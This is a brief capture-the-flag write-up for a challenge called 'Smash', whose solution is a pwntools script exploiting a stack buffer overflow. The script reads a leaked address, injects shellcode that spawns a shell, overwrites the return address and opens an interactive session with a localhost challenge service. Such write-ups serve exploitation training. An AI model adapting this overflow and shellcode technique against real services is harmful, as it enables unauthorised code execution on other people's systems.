# Smash

## Description
Smashing binaries is pretty therapeutic -- you should try it some time.

## Solution

```python
from pwn import *
import re

elf = ELF("./smash")

context.binary = elf;
context.log_level = "debug"

io = remote("localhost", 7071)
s = re.search("0x[0-9a-f]+", io.clean().decode())
addr = int(s.group(0), 16)
shell = asm(shellcraft.amd64.linux.sh());
space = 128 + 8
padding = (space - len(shell)) * b"A"
payload = shell + padding + p64(addr)

io.sendline(payload)
io.interactive()
```
